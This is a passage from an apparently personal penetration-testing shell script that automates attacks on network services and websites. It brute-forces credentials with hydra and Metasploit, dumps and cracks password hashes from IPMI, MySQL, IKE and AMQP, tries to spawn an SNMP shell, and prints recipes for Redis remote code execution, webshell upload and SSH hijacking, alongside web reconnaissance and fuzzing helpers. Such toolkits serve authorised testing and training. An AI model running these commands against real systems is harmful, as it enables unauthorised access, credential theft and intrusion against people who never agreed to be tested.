            echo -e "\nPERFORMING USER BRUTEFORCING (XATO-TOP-1000 / PROBABLE-V2)\n"
            echo "$2:$3" > /tmp/$2_host.txt
            cur=$(pwd) && cd ~/TOOLS/snmpwn && ./snmpwn.rb -u /usr/share/seclists/Usernames/xato_top_1000_custom.txt -p /usr/share/seclists/Passwords/probable-v2-top1575.txt --enclist /usr/share/seclists/Passwords/probable-v2-top1575.txt -h /tmp/$2_host.txt && cd $cur

            echo ""; read -r snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
            usr=$(echo $snmp_data | cut -d':' -f1)
            pass=$(echo $snmp_data | cut -d':' -f2)

            read -r snmp_os\?"INPUT OPERATING SYSTEM (lin, win): "
            if [[ $snmp_os == "win" ]]; then
                echo -e "\nEXTRACING USERS\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.4.1.77.1.2.25

                echo -e "\nEXTRACTING PROCESSES\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.25.4.2.1.2            

                echo -e "\nEXTRACTING INSTALLED SOFTWARE\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.25.6.3.1.2

                echo -e "\nEXTRACING LOCAL PORTS\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.6.13.1.3
            fi

            echo -e "\nFETCHING STRINGS IN \"$2_SNMPWALK.txt\"\n"
            snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $2_SNMPWALK.txt

            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $2_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $2_SNMPWALK.txt    

        else
            echo -e "\nBRUTEFORCING COMMUNITY STRING\n"
            onesixtyone -p $3 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $2
            echo ""; read -r com_string\?"INPUT A VALID COMMUNITY STRING (CTRL-C IF NONE): "

            echo -e "\nDUMPING PARSED MIB TREE IN \"$2_SNMPCHECK.txt\""
            snmp-check -v $snmp_ver -p $3 -d -c $com_string $2 > $2_SNMPCHECK.txt

            echo -e "\nDUMPING MIB STRINGS IN \"$2_SNMPWALK.txt\"\n"
            snmpwalk -mAll -r 2 -t 10 -v$snmp_ver -c $com_string $2:$3 | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $2_SNMPWALK.txt

            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $2_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $2_SNMPWALK.txt

            echo -e "\nTRYING TO SPAWN A NET-SNMP SHELL (WRITE PRIVILEGE)\n"
            /home/kali/TOOLS/snmp-shell/venv/bin/python3 ~/TOOLS/snmp-shell/shell.py -v $snmp_ver -c $com_string $2:$3
        fi
    fi

    if [[ $1 == "rpc" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
	    sudo nmap -n -Pn -sV -p$3 --script="msrpc-enum" $2

	    echo -e "\nTRYING NULL/GUEST BINDINGS\n"
        rpcclient -U "" -N $2
    	rpcclient -U "%" -N $2
        rpcclient -U "Guest" -N $2

        echo -e "\nCHECKING IOXID INTERFACES/IPs\n"
        /home/kali/TOOLS/IOXIDResolver/venv/bin/python3 ~/TOOLS/IOXIDResolver/IOXIDResolver.py -t $2
    fi

    if [[ $1 == "imap" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="imap-* and not brute" -p$3 $2
    
        echo -e "\nMSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/imap/imap_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)

            echo -e "\nLISTING MAILBOXES\n"
            curl -u "$usr:$psw" imap://$2:$3 -X 'LIST "" "*"'

            while true; do read -r mailbox\?"INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$2:$3/$mailbox && read -r index\?"INPUT MAIL UID TO read -r (BLANK TO SKIP): " && curl -u "$usr:$psw" "imap://$2:$3/$mailbox;UID=$index"; done
        fi

    fi

    if [[ $1 == "ipmi" ]]; then
        echo -e "\nENUMERATING VERSION\n"
        sudo nmap -n -Pn -v -sUV --script "ipmi-* or supermicro-ipmi-conf" -p$3 $2
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\nCHECKING ANONYMOUS USER LISTING\n"
        ipmitool -I lanplus -H $2 -U '' -P '' user list

        echo -e "\nCHECKING HASH DUMP\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $2; set RPORT $3; set OUTPUT_JOHN_FILE /tmp/$2_IPMI.john; exploit; exit"
        if [[ -f /tmp/$2_IPMI.hashcat ]]; then
            echo -e "\nFOUND HASH, CRACKING WITH ROCKYOU\n"
            john --wordlist=/usr/share/wordlists/weakpass_4.txt --fork=15 --session=ipmi --rules=Jumbo --format=rakp /tmp/$2_IPMI.john
        fi

        echo -e "\nCHECKING CIPHER ZERO\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r resp\?"IS CIPHER ZERO SUCCESSFUL? (Y/N): "
        if [[ $resp =~ [Yy] ]]; then
            echo -e "\nAUTHENTICATING AS ROOT AND DUMPING USERS\n"
            ipmitool -I lanplus -C 0 -H $2 -U root -P root user list
        fi
    fi

    if [[ $1 == "ldap" ]]; then 
        echo -e "\nNMAP SCANNING\n" 
        sudo nmap -n -Pn -sV --script "ldap-* and not brute" -p$3 $2
        
        echo -e "\nTESTING NULL BIND\n"
        ldapsearch -H ldap://$2:$3 -x -s base namingcontexts
    fi

    if [[ $1 == "netbios" ]]; then
        echo -e "\nGETTING DOMAINS, HOSTS AND MACS\n"
        nmblookup -A $2
        nbtscan $2/30
        sudo nmap -sU -sV --script nbstat -p$3 -n -Pn $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/netbios/nbname; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "afp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="afp-* and not dos and not brute"
    
        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/afp/afp_server_info; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "smb" ]]; then
        echo -e "\nNMAP SERVICE ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="smb-enum-* or smb-ls or smb-os-discovery or smb2-* or smb-mbenum or smb-security-mode or smb-server-stats or smb-system-info" -p$3 $2

        echo -e "\nTRYING NULL/GUEST BINDINGS\n"
        nxc smb $2 -u '' -p '' --port $3
        nxc smb $2 -u 'Guest' -p '' --port $3
        nxc smb $2 -u '' -p '' --local-auth --port $3
        nxc smb $2 -u 'Guest' -p '' --local-auth --port $3

        read -r resp\?"DO YOU WANT TO TEST SMBCLIENT BINDINGS? (Y/N): "
        if [[ $resp =~ [Yy] ]]; then
            echo -e "\nSTANDARD CHECK\n"
            smbclient -p $3 -N -L $2
            smbclient -p $3 -U 'Guest%' -L $2

            echo -e "\nLANMAN1 CHECK\n"
            smbclient -p $3 -N -L $2 --option="client min protocol=LANMAN1"
            smbclient -p $3 -U 'Guest%' -L $2 --option="client min protocol=LANMAN1"

            echo -e "\nNT1 CHECK\n"
            smbclient -p $3 -N -L $2 --option="client min protocol=NT1"
            smbclient -p $3 -U 'Guest%' -L $2 --option="client min protocol=NT1"
        fi

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/smb-betterdefaultpasslist.txt $1://$2:$3

        echo -e "\nMSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $2; set RPORT $3; exploit; exit" 

        echo -e "\nNMAP VULNERABILITY SCANNING\n"
        sudo nmap -p$3 -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse $2
    fi

    if [[ $1 == "irc" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="irc-* and not brute" -p$3 $2

        echo -e "\nATTEMPTING ANONYMOUS CONNECTION TO THE IRC AS \"test_user\"\n"
        irssi -c $2 -p $3 -n test_user
    fi

    if [[ $1 == "ike" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV -p$3 --script="ike-version" $2

        echo -e "\nLAUNCHING IKE-SCAN -> CHECK IF 1 HANDSHAKE AND 0 NOTIFY\n"
        sudo ike-scan -M --showbackoff $2 -d $3
        sudo ike-scan -M --showbackoff --ikev2 $2 -d $3

        read -r tra\?"DO YOU WANT TO BRUTEFORCE ID VALUES? (Y/N)"
        if [[ $tra =~ [Yy] ]]; then
            echo -e "\nBRUTEFORCING TRANSFORMATION\n"
            sudo python3 ~/TOOLS/iker.py $2
        fi
    
        read -r grp\?"DO YOU WANT TO BRUTEFORCE GROUP IDS WITH IKE-SCAN METHOD? (Y/N)"
        if [[ $grp =~ [Yy] ]]; then
            echo -e "\nBRUTEFORCING VIA IKE-SCAN\n"
            while read -r line; do (echo "Found ID: $line" && sudo ike-scan -d $3 -M -A -n $line $2) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < ~/WORDLISTS/ike-custom.txt
        fi

        read -r ike_id\?"INPUT A VALID IKE-ID (BLANK TO SKIP): "
        if [[ ! -z $ike_id ]]; then
            echo -e "\nGRABBING AND CRACKING HASH\n"
            ike-scan -M -A -n $ike_id --pskcrack=$2_hash.txt $2
            psk-crack -d /usr/share/wordlists/weakpass_4.txt $2_hash.txt    

            read -r ike_psw\?"INPUT FOUND PSK PASSWORD: "
            if [[ ! -z $ike_psw ]]; then
                echo -e "\nINITIATING STRONG-SWAN CONNECTION -> USE sT NMAP SCAN!\n"
                chnic

                echo "$ip $2 : PSK \"$ike_psw\"" | sudo tee --append /etc/ipsec.secrets
                echo "conn host_$2\n\tauthby=secret\n\tauto=add\n\tkeyexchange=ikev1\n\tike=3des-sha1-modp1024!\n\tleft=$ip\n\tright=$2\n\ttype=transport\n\tesp=3des-sha1!\n\trightprotoport=tcp" | sudo tee --append /etc/ipsec.conf

                sudo ipsec stop
                sudo ipsec start
                sudo ipsec up host_$2
            fi
        fi
    fi

    if [[ $1 == "rtsp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "rtsp-* and not brute" -p$3 $2
    fi


    if [[ $1 == "rsync" ]]; then
        echo -e "\nENUMERATION AND MODULE LISTING\n"
        sudo nmap -n -Pn  -v -sV --script "rsync-* and not brute" -p$3 $2

        while true; do read -r shr\?"INPUT SHARE NAME TO DOWNLOAD (CTRL-C IF NONE): " && echo -e "\nDOWNLOADING \"$shr\" IN \"./$2-$shr_RSYNC\"\n" &&  mkdir $2-$shr_RSYNC && cd $2-$shr_RSYNC && rsync -av rsync://$2:$3/$shr && cd ..; done
    fi

    if [[ $1 == "mssql" ]]; then
        echo -e "\nENUMERATION + DEFAULT SA LOGIN\n"
        sudo nmap -n -Pn  -v -sV --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=$3,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -p$3 $2

        echo -e "\nMSF FINGERPRINTING\n"
        msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RPORT $3; set RHOSTS $2; exploit; exit"

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt $1://$2:$3

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)
            read -r dom\?"INPUT INSTANCE NAME: "

            echo -e "\nATTEMPTING WINDOWS AUTHENTICATION\n"
            mssqlclient.py "$dom/$usr:$psw@$2" -windows-auth
        fi
    fi

    if [[ $1 == "rsh" ]]; then
        echo -e "\nMSF BRUTEFORCING (XATO-TOP-1000 / PROBABLE V2)\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rsh_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set BLANK_PASSWORDS true; set USER_FILE /usr/share/seclists/usernames/xato_top_1000_custom.txt; set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top1575.txt; set RPORT $3; set RHOSTS $2; exploit; exit"

        echo -e "\nBRUTEFORCING VALID USERS (XATO-TOP-1000)\n"
        hydra -L /usr/share/seclists/usernames/xato_top_1000_custom.txt rsh://$2:$3 -v -V
    fi

    if [[ $1 == "dhcp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sCV --script="broadcast-dhcp* or dhcp-*" -p$3 $2
    fi

    if [[ $1 == "rexec" ]]; then
        echo -e "\nMSF BRUTEFORCING (PROBABLE V2)\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rexec_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set BLANK_PASSWORDS true; set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top1575.txt; set RPORT $3; set RHOSTS $2; exploit; exit"
    fi

    if [[ $1 == "rlogin" ]]; then
        echo -e "\nMSF BRUTEFORCING (PROBABLE V2)\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rlogin_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set BLANK_PASSWORDS true; set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top1575.txt; set RPORT $3; set RHOSTS $2; exploit; exit"
    fi

    if [[ $1 == "tns" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "oracle-tns-version" -p$3 $2

        echo -e "\nODAT TESTING\n"
        odat all -s $2 -p $3

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)
            read -r db\?"INPUT DATABASE NAME: "

            echo -e "\nATTEMPTING SYSDBA AUTHENTICATION\n"  
            sqlplus "$usr/$psw@$2/$db" as sysdba
        fi
    fi

    if [[ $1 == "ajp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script="ajp-* and not brute" -p$3 $2
    fi

    if [[ $1 == "memcache" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script=memcached-info -p$3 $2

        echo -e "\nMSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/memcached/memcached_amp; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/memcached/memcached_udp_version; set RPORT $3; set RHOSTS $2; exploit; exit"

        echo -e "\nFETCHING ITEMS\n"
        memcdump --servers=$2

        while true; do read -r item\?"INPUT ITEM NAME TO READ: " && memccat --servers=$2 $item; done
    fi

    if [[ $1 == "redis" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script "redis-* and not brute" -p$3 $2
        
        echo -e "\nAUTHENTICATION -> redis-cli -h $2 -p $3 -> \"info\""
        echo -e "\nDB DUMPING -> \"INFO keyspace\" -> SELECT {NUM} -> KEYS * -> DUMP {KEY}"
        echo -e "\nRCE <= 5.0.5 -> \"redis-rogue-server.py --rhost $2 --rport $3 --lhost {KALI_IP}\""
        echo -e "\nWEBSHELL UPLOAD -> \"config set dir {WEB_ROOT} -> config set dbfilename {SHELL.php} -> set test {SHELL_PAYLOAD} -> save\""
        echo -e "\nSSH HIJACKING -> \"~/TOOLS/Redis-Server-Exploit/redis.py\""
        echo -e "\nMANUAL MODULE RCE -> \"https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\""
    fi


    if [[ $1 == "vnc" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p$3 $2

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt vnc://$2:$3

        read -r psw\?"INPUT VALID PASSWORD IF FOUND: "
        if [[ ! -z $psw ]]; then
            echo -e "\nATTEMPTING CONNECTION\n"
            echo $psw > /tmp/$2_VNCPASS.txt
            vncviewer -passwd /tmp/$2_VNCPASS.txt $2::$3
        fi 
    fi

    if [[ $1 == "squid" ]]; then
        echo -e "\nCHECKING IF PIVOTING IS POSSIBLE\n"
        python3 ~/TOOLS/spose/spose.py --proxy "http://$2:$3" --target "$2"

        read -r conf\?"DO YOU WANT TO ADD THE PROXYCHAINS ENTRY? (Y/N): "
        if [[ $conf =~ [Yy] ]]; then
            flg=""
            read -r creds\?"INPUT \"USER:PASS\" COMBO IF AUTHENTICATION IS NEEDED: "
            if [[ ! -z $creds ]]; then
                flg=" $(echo $creds | cut -d":" -f1) $(echo $creds | cut -d":" -f2)"
            fi

            echo -e "\nADDING PROXY\n"
            echo "http $2 $3$flg" | sudo tee --append /etc/proxychains4.conf

            echo -e "\nTESTING CONNECT SCAN (TOP 100 PORTS)\n"
            sudo proxychains nmap -sT -n --top-ports 100 127.0.0.1
        fi
    fi

    if [[ $1 == "mysql" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="mysql-* and not brute" -p$3 $2

        echo -e "\nMSF UNAUTHENTICATED HASH DUMP CHECK\n"
        msfconsole -q -x "use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RPORT $3; set RHOSTS $2; exploit; exit"

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$2:$3

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)
           
            echo -e "\nATTEMPTING HASH DUMP\n"
            msfconsole -q -x "use auxiliary/scanner/mysql/mysql_hashdump; set USERNAME $usr; SET PASSWORD $psw; set RPORT $3; set RHOSTS $2; exploit; exit"
    
            echo -e "\nATTEMPTING LOGIN\n"
            mysql ssl-verify-server-cert=false -h $2 -P $3 -u "$usr" -p "$psw"
        fi

    fi

    if [[ $1 == "amqp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="amqp-info" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/amqp/amqp_version; set RPORT $3; set RHOSTS $2; exploit; exit"
    
        echo -e "\nCHECKING GUEST AUTHENTICATION\n"
        curl -kIL http://$2:$3/api/connections -u guest:guest

        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $cred ]]; then
            echo -e "\nFETCHING API CONNECTIONS\n"
            curl -kIL http://$2:$3/api/connections -u "$cred"
        fi

        read -r amqp_hash\?"INPUT B64 AMQP HASH IF FOUND: "
        if [[ ! -z $amqp_hash ]]; then
            echo $amqp_hash | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > /tmp/$2_AMQP.txt
            hashcat -m 1420 --hex-salt /tmp/$2_AMQP.txt /usr/share/wordlists/weakpass_4.txt
        fi
    fi

    if [[ $1 == "mongodb" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -pn -v -sV --script="mongodb-* and not brute" -p$3 $2

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING LOGIN\n"
            mongo -u $usr -p $psw --port $3 $2
        fi
    fi

    if [[ $1 == "glusterfs" ]]; then
        echo -e "\nLISTING AVAILABLE VOLUMES\n"
        sudo gluster --remote-host=$2:$3 volume list

        read -r glust\?"INPUT VOLUME TO MOUNT: "
        echo -e "\nMOUNTING VOLUME \"$glust\"\n"
        sudo mkdir /mnt/$glust && sudo mount -t glusterfs $2:$3/$glust /mnt/$glust && cd /mnt/$glust
    fi

    if [[ $1 == "rdp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="rdp-* and not brute" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; set RPORT $3; set RHOSTS $2; exploit; exit"

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING LOGIN\n"
            xfreerdp /u:$usr /p:"$psw" /v:$2 +clipboard
        fi
    fi

    if [[ $1 == "svn" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="http-svn-* or svn-brute" -p$3 $2

        echo -e "\nREPOSITORY LISTINGS\n"
        svn ls svn://$2:$3

        echo -e "\nFETCHING COMMIT HISTORY\n"
        svn log svn://$2:$3

        echo -e "\nDOWNLOADING REPOSITORY\n"
        mkdir /tmp/$2_SVN && cd /tmp/$2_SVN && svn checkout svn://$2:$3

        echo -e "\nTO CHANGE REVISION -> \"svn up -r {NUMBER}\"\n"
    fi
}

#------------------------WEB PENTESTING ---------------------#
# HTTP Tech Scanning function
techscan(){
        host=$(echo $1 | unfurl domain)
        port=$(echo $1 | unfurl format %P)
        scheme=$(echo $1 | unfurl format %s)

        if [[ -z $port ]]; then
            if [[ $scheme == "http" ]]; then
                port=80
            fi
            if [[ $scheme == "https" ]]; then
                port=443
            fi
        fi

        echo -e "\nHTTPX / CDN CHECK\n"
        httpx -up &>/dev/null && cdncheck -up &>/dev/null
        echo $1 | httpx -fr -silent -sc -server -title -cdn -cname -td
        echo $1 | cdncheck

        echo -e "\nSERVER HEADER\n"
        curl -kIL $1

        echo -e "\nDEFAULT ALLOWED METHODS\n"
        curl -kILX OPTIONS $1

        echo -e "\nTECHNOLOGY SCANNING\n"
        whatweb -a 3 $1

        echo -e "\nCHECKING WAF PRESENCE\n"
        wafme0w -t $1 --no-warning --concurrency 15

        read -r pub\?"IS THE DOMAIN BEHIND CLOUDFLARE? (Y/N): "
        if [[ $pub =~ [Yy] ]]; then
            echo -e "\nCHECKING UNCOVERING & PUBLIC SUBDOMAINS\n"
            cur=$(pwd) && cd /home/kali/TOOLS/CloakQuest3r && ./venv/bin/python3 cloakquest3r.py $domain && cd $cur
        fi

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -Pn -sV --script="http-enum" -p$port $host

        echo -e "\nNIKTO HOST SCANNING\n"
        nikto -h $host:$port -Tuning b

        if [[ $scheme == "https" ]]; then
            echo -e "\nTESTING HEARTBLEED\n"
            if [[ $port == "443" ]]; then
                flg=""
            else
                flg=":$port"
            fi
	        Heartbleed https://$host$flg
        fi
}

#CORS Scanning
corscan(){
    /home/kali/TOOLS/Corsy/venv/bin/python3 ~/TOOLS/Corsy/corsy.py -u $1
}

#Crawling/JS Scraping Function
crawl(){
        echo -e "\nALIVE URLS & SUBDOMAINS\n"
        gospider -t 25 --js false -s $1 --sitemap -d 2 --subs | grep -vE "\.js$" | grep -E "\[code-200]|\[subdomains\]" | grep "$(echo $1 | unfurl format %d)" | uniq

        echo -e "\nFORMS\n"
        gospider -t 25 --js false -s $1 --sitemap -d 2 --subs | grep "\[form\]" | grep "$(echo $1 | unfurl format %d)" | uniq

        echo -e "\nQUERY STRINGS\n"
        python3 ~/TOOLS/ReconSpider.py $1 &>/dev/null
        cat results.json | jq '.links[]' | tr -d '"' | qsreplace FUZZMYVAL | grep FUZZMYVAL | grep "$(echo $1 | unfurl format %d)" | uniq

        echo -e "\nJS FILES\n"
        cat results.json | jq '.js_files[]'

        echo -e "\nCOMMENTS\n"
        cat results.json | jq '.comments[]'

        echo -e "\nEMAILS\n"
        cat results.json | jq '.emails[]'
        rm results.json

        echo -e "\nSEARCHING BROKEN LINK REFERENCES\n"
        blc $1 -ro --filter-level 2 --exclude-internal
}

# JS Secret/Endpoint Mining
jsmine(){
    echo -e "\nCHECKING SECRETS IN JS FILES\n"
    /home/kali/TOOLS/SecretFinder/venv/bin/python3 ~/TOOLS/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli

    echo -e "\nEXTRACTING ENDPOINTS FROM JS FILES\n"
    /home/kali/TOOLS/LinkFinder/venv/bin/python3 /home/kali/TOOLS/LinkFinder/linkfinder.py -i $1 -d -o cli 
}

# Passwordlist generation
pswgen(){
    dom=$(echo $1 | unfurl format %d)

    echo -e "\nGENERATING WORDLIST\n"
    cewl $1 -d 4 -m 5 --lowercase -w passwords_$dom.txt

    echo -e "\nHASHCAT MANGLING\n"
    hashcat --stdout --rules-file /usr/share/hashcat/rules/my_custom.rule passwords_$dom.txt > /tmp/pstmp_$dom.txt
    cat /tmp/pstmp_$dom.txt | sort -u | shuf > mangled_$dom.txt; rm /tmp/pstmp_$dom.txt 
}

# Endpoints Generation
urlgen(){
    echo -e "\nGENERATING WORDLIST\n"
    cewl $1 -d 3 -m 3 --lowercase -w endpoints.txt
}

# Usernames Generation
usergen(){
    echo -e "\nGENERATING USERNAMES\n"
    ~/TOOLS/username-anarchy/username-anarchy -i $1 > gen_users.txt
}

# Default credentials for services / applications
searchpass(){
    sudo pass-station search $1
}

# Add/Extend Host Mappings of /etc/hosts
addhost() {
    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}

# Content Discovery --> (Directories, Files, Backups)
dirfuzz(){    
    echo -e "\nSEARCHING COMMON CONTENT\n"
    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -v
    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -v
    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -v
    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt -v

    echo -e "\nSEARCHING RAFT DIRECTORIES\n"
    ffuf -ac -acs advanced -r  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -v

    echo -e "\nSEARCHING RAFT FILES\n"
    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -v

    echo -e "\nCHECKING NUCLEI HTTP EXPOSURES\n"    
    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
    nuclei -u $1 -t http/exposures

    read -r cel\?"INPUT ENDPOINT FOR GENERATED FUZZING IF NEEDED (Current -> \"$1\"): "
    if [[ ! -z $cel ]]; then
        echo -e "\nGENERATED FUZZING\n"
        cewl $cel -d 4 -m 3 --lowercase --with-numbers --convert-umlauts -w /tmp/$(echo $1 | unfurl format %d).txt
        ffuf -ac -acs advanced -r  -u $1/FUZZ/ -c -w /tmp/$(echo $1 | unfurl format %d).txt -v 
        rm /tmp/$(echo $1 | unfurl format %d).txt
    fi

    echo -e "\nBIGGER DIRECTORY SEARCH\n"
